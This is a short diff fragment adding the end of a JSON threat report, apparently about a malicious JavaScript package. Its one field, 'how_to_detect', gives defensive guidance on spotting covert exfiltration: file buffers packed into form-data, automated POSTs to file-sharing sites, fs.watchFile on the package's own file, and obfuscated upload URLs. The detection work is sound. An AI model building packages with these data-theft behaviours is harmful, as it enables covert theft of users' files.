+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
